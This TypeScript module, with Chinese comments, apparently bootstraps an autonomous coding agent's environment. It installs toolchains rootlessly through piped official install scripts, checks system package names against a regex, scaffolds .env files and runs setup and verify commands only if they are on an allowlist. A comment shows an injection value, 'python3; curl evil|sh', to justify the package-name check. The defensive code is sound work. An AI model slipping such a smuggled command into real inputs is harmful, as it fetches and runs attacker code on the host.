/**
 * 裸机 bootstrap（spec §4.2 autopilot_init）：
 *
 *   探测工具链 → rootless 安装缺失项 → 执行仓库的
 *   setupCommand → 执行 verifyCommand 作为环境自检。
 *
 * 所有命令都经由命令白名单执行；所有输出都会脱敏。
 * 安装脚本是固定的、经过审计的命令（Bun 官方脚本 → ~/.bun），
 * 绝不使用模型生成的 shell。
 */
import { execFile } from 'node:child_process';
import { access, copyFile } from 'node:fs/promises';
import { homedir } from 'node:os';
import { join } from 'node:path';
import { isAllowed, commandHead } from './gates.js';
import { runShell as runShared } from './exec.js';
import type { SecretRedactor } from './secrets.js';

export interface ToolchainProbe {
  tool: string;
  available: boolean;
  version: string | null;
}

export interface BootstrapReport {
  toolchain: ToolchainProbe[];
  installed: string[];
  setupRan: boolean;
  setupLogTail: string | null;
  verifyRan: boolean;
  verifyPassed: boolean;
  verifyLogTail: string | null;
  /** 通过 packageManagerCommand 安装的系统包。 */
  systemPackages: string[];
  /** 由 envExample 生成的 env 文件路径（若适用）。 */
  envFile: string | null;
  envScaffolded: boolean;
  /** 项目需要但当前未设置的环境变量名。 */
  missingEnvKeys: string[];
}

export class BootstrapError extends Error {
  constructor(
    message: string,
    public readonly report: BootstrapReport,
  ) {
    super(message);
    this.name = 'BootstrapError';
  }
}

const VERSION_FLAGS: Record<string, string[]> = {
  git: ['--version'],
  bun: ['--version'],
  pnpm: ['--version'],
  node: ['--version'],
  docker: ['--version'],
};

/** 探测单个工具：解析其可执行文件与版本。 */
export async function probeTool(tool: string, extraPaths: string[] = []): Promise<ToolchainProbe> {
  const flag = VERSION_FLAGS[tool] ?? ['--version'];
  const candidates = [tool, ...extraPaths.map((dir) => join(dir, tool))];
  for (const candidate of candidates) {
    try {
      const { stdout: versionOut } = await new Promise<{ stdout: string }>((resolvePromise, reject) => {
        execFile(candidate, flag, { timeout: 10_000 }, (error, stdoutText) => {
          if (error !== null) reject(error);
          else resolvePromise({ stdout: stdoutText });
        });
      });
      return { tool, available: true, version: versionOut.trim().split('\n')[0] ?? null };
    } catch {
      // 尝试下一个候选路径
    }
  }
  return { tool, available: false, version: null };
}

const BUN_HOME = join(homedir(), '.bun', 'bin');
const NODE_HOME = join(homedir(), '.node', 'bin');

/**
 * 返回 `keys` 中尚未在环境里设置的那些键。当项目需要裸机尚未提供的密钥时，
 * 用它来显式报错（给出确切的键名），而不是抛出笼统的 setup 错误。
 */
export function checkRequiredEnv(keys: readonly string[]): string[] {
  return keys.filter((key) => {
    const value = process.env[key];
    return value === undefined || value === '';
  });
}

/**
 * 根据已提交的示例文件（如 `.env.example`）生成 `.env` 文件。
 * 绝不覆盖已存在的文件；若示例文件不存在则静默跳过。
 * 返回实际发生的情况，以便 bootstrap 报告呈现出来。
 */
export async function scaffoldEnvFile(
  envPath: string,
  examplePath: string,
): Promise<'created' | 'exists' | 'no-example'> {
  try {
    await access(envPath);
    return 'exists';
  } catch {
    // envPath 不存在 — 继续往下。
  }
  try {
    await copyFile(examplePath, envPath);
    return 'created';
  } catch {
    return 'no-example';
  }
}

/**
 * 以 rootless 方式安装缺失的工具。目前支持：bun（官方安装脚本，装到 ~/.bun）。
 * 其他工具必须由人工提供（结果会回报，以便 autopilot_init 带着精确信息升级上报）。
 */
export async function installTool(
  tool: string,
  redactor: SecretRedactor,
  signal?: AbortSignal,
): Promise<{ ok: boolean; logTail: string }> {
  if (tool === 'bun') {
    const command = 'curl -fsSL https://bun.sh/install | bash';
    const result = await runShell(command, homedir(), redactor, signal);
    return { ok: result.exitCode === 0, logTail: result.logTail };
  }
  if (tool === 'pnpm') {
    // pnpm 通过 corepack（node 自带）或独立脚本安装。
    const result = await runShell('corepack enable pnpm || curl -fsSL https://get.pnpm.io/install.sh | sh -', homedir(), redactor, signal);
    return { ok: result.exitCode === 0, logTail: result.logTail };
  }
  if (tool === 'node') {
    // 通过官方 portable tarball 以 rootless 方式把 Node 装到 ~/.node。尽最大努力即可：
    // 构建链（nuxt / pnpm CLI）本身就是 Node 程序，而裸 Linux 机器可能没有。
    // 这里不放裸机系统包（供 better-sqlite3 这类原生模块使用的 build-essential
    // / python3 / make / g++）—— 它们应通过配置好的包管理器命令放进 `systemPackages`。
    const arch = process.arch === 'arm64' ? 'arm64' : 'x64';
    const command = `curl -fsSL https://nodejs.org/dist/latest-v22.x/ | grep -m1 -oE 'node-v[0-9]+\\.[0-9]+\\.[0-9]+-linux-${arch}\\.tar\\.xz' | grep -oE 'v[0-9]+\\.[0-9]+\\.[0-9]+' | tail -1 | xargs -I{} sh -c 'curl -fsSL https://nodejs.org/dist/{}/node-{}-linux-${arch}.tar.xz | tar -xJ -C "$HOME/.node" --strip-components=1'`;
    const result = await runShell(command, homedir(), redactor, signal);
    return { ok: result.exitCode === 0, logTail: result.logTail };
  }
  return {
    ok: false,
    logTail: `no rootless installer known for "${tool}"; a human must install it (e.g. git via the OS package manager)`,
  };
}

/** rootless 工具链的探测位置，会被加入 PATH。 */
const EXTRA_BIN_DIRS = [BUN_HOME, NODE_HOME];

/**
 * 系统包名的允许字符集。包名会被拼进一条 shell 命令，所以除字面量外一律不接受：
 * `;` `&` `|` `$` 反引号 括号 引号 空白 等全部落在字符类之外。
 * 额外放行 `= : @ +` 是为了兼容 apt/dnf 的版本与架构后缀（如 `python3=3.11-1`）。
 */
const PACKAGE_NAME_RE = /^[A-Za-z0-9][A-Za-z0-9._+@=-]*$/;

/**
 * bootstrap 专用封装：保持原有四参数签名（六个调用点不动），只把 execFile 样板
 * 交给共享 runner，留下本链路特有的两点差异 —— PATH 前置 rootless 安装目录，
 * 以及就地脱敏日志尾（顺序仍是先截尾再脱敏，与合并前一致）。不设超时。
 */
async function runShell(
  command: string,
  cwd: string,
  redactor: SecretRedactor,
  signal?: AbortSignal,
): Promise<{ exitCode: number; logTail: string }> {
  const result = await runShared({
    command,
    cwd,
    extraEnv: { PATH: `${EXTRA_BIN_DIRS.join(':')}:${process.env.PATH ?? ''}` },
    label: 'bootstrap',
    ...(signal !== undefined ? { signal } : {}),
  });
  return { exitCode: result.exitCode, logTail: redactor.redact(result.logTail) };
}

export interface BootstrapOptions {
  toolchain: readonly string[];
  setupCommand: string;
  verifyCommand: string;
  /** setup/verify 命令运行的仓库检出目录。 */
  repoPath: string;
  allowlist: readonly string[];
  redactor: SecretRedactor;
  signal?: AbortSignal;
  /**
   * 为原生模块构建准备的系统包（例如 better-sqlite3 这类 node-gyp 模块
   * 需要 `['python3', 'make', 'g++']`）。
   * 通过 `packageManagerCommand` 安装；必须在白名单内。
   */
  systemPackages?: readonly string[] | undefined;
  /** 包管理器命令（会做白名单校验），例如 `sudo apt-get install -y`。 */
  packageManagerCommand?: string | undefined;
  /** 当 `.env` 缺失时，根据已提交示例生成它的路径。 */
  envFile?: string | undefined;
  /** 已提交的 `.env.example` 的路径。 */
  envExample?: string | undefined;
  /** 项目启动时需要设置的环境变量名；缺失时显式报错。 */
  requiredEnvKeys?: readonly string[] | undefined;
}

/**
 * 完整的 bootstrap 流程。当工具链无法满足或 setup/verify 失败时，
 * 抛出 BootstrapError（附带报告）—— 调用方会带着报告升级上报。
 */
export async function bootstrapEnvironment(options: BootstrapOptions): Promise<BootstrapReport> {
  const report: BootstrapReport = {
    toolchain: [],
    installed: [],
    setupRan: false,
    setupLogTail: null,
    verifyRan: false,
    verifyPassed: false,
    verifyLogTail: null,
    systemPackages: [],
    envFile: options.envFile ?? null,
    envScaffolded: false,
    missingEnvKeys: [],
  };

  // 1. 探测工具链，然后 rootless 安装缺失项。
  for (const tool of options.toolchain) {
    let probe = await probeTool(tool, EXTRA_BIN_DIRS);
    if (!probe.available) {
      const install = await installTool(tool, options.redactor, options.signal);
      probe = await probeTool(tool, EXTRA_BIN_DIRS);
      if (install.ok && probe.available) {
        report.installed.push(tool);
      }
    }
    report.toolchain.push(probe);
  }
  const missing = report.toolchain.filter((probe) => !probe.available).map((probe) => probe.tool);
  if (missing.length > 0) {
    throw new BootstrapError(
      `toolchain incomplete: ${missing.join(', ')} could not be installed rootlessly; a human must provision them`,
      report,
    );
  }

  // 1b. 准备原生构建所需的系统包（会做白名单校验）。
  const systemPackages = options.systemPackages ?? [];
  if (systemPackages.length > 0) {
    const pm = options.packageManagerCommand ?? '';
    if (pm.trim() === '') {
      throw new BootstrapError(
        `systemPackages [${systemPackages.join(', ')}] requested but packageManagerCommand is empty; set it (e.g. "sudo apt-get install -y")`,
        report,
      );
    }
    // 包名会被裸拼进 pm 后面交给 shell，所以先要求它们是纯字面量：允许 apt/dnf
    // 的版本与架构后缀（= : @ + . -），但任何 shell 语法一律拒绝。
    // 少了这一步，`systemPackages: ['python3; curl evil|sh']` 就让下面的 pm
    // 白名单校验形同虚设 —— 拼出来的 `rm` 没有任何一处检查见过。
    const smuggled = systemPackages.filter((name) => !PACKAGE_NAME_RE.test(name));
    if (smuggled.length > 0) {
      throw new BootstrapError(
        `systemPackages must be plain package names; rejected: ${smuggled.join(', ')}`,
        report,
      );
    }
    if (!isAllowed(pm, options.allowlist)) {
      throw new BootstrapError(
        `packageManagerCommand "${pm}" is not on the command allowlist [${options.allowlist.join(', ')}]`,
        report,
      );
    }
    const result = await runShell(`${pm} ${systemPackages.join(' ')}`, options.repoPath, options.redactor, options.signal);
    report.systemPackages = [...systemPackages];
    if (result.exitCode !== 0) {
      throw new BootstrapError(`system package install failed (exit ${result.exitCode})`, report);
    }
  }

  // 1c. 根据已提交的示例生成 .env，然后在缺少键时显式报错。
  if (options.envFile !== undefined && options.envFile !== '') {
    const state = await scaffoldEnvFile(options.envFile, options.envExample ?? '');
    report.envScaffolded = state === 'created';
  }
  report.missingEnvKeys = checkRequiredEnv(options.requiredEnvKeys ?? []);
  if (report.missingEnvKeys.length > 0) {
    throw new BootstrapError(
      `project requires env vars that are not set: ${report.missingEnvKeys.join(', ')}`,
      report,
    );
  }

  // 2. setup / verify 命令必须像任何成员命令一样通过白名单校验。
  for (const command of [options.setupCommand, options.verifyCommand]) {
    if (commandHead(command) !== '' && !isAllowed(command, options.allowlist)) {
      throw new BootstrapError(
        `bootstrap command "${command}" is not on the command allowlist [${options.allowlist.join(', ')}]`,
        report,
      );
    }
  }

  // 3. Repo setup (install + migrate + seed).
  if (options.setupCommand.trim() !== '') {
    report.setupRan = true;
    const setup = await runShell(options.setupCommand, options.repoPath, options.redactor, options.signal);
    report.setupLogTail = setup.logTail;
    if (setup.exitCode !== 0) {
      throw new BootstrapError(`setupCommand "${options.setupCommand}" failed (exit ${setup.exitCode})`, report);
    }
  }

  // 4. Environment self-verification.
  if (options.verifyCommand.trim() !== '') {
    report.verifyRan = true;
    const verify = await runShell(options.verifyCommand, options.repoPath, options.redactor, options.signal);
    report.verifyLogTail = verify.logTail;
    report.verifyPassed = verify.exitCode === 0;
    if (!report.verifyPassed) {
      throw new BootstrapError(`verifyCommand "${options.verifyCommand}" failed (exit ${verify.exitCode})`, report);
    }
  } else {
    report.verifyPassed = true;
  }

  return report;
}
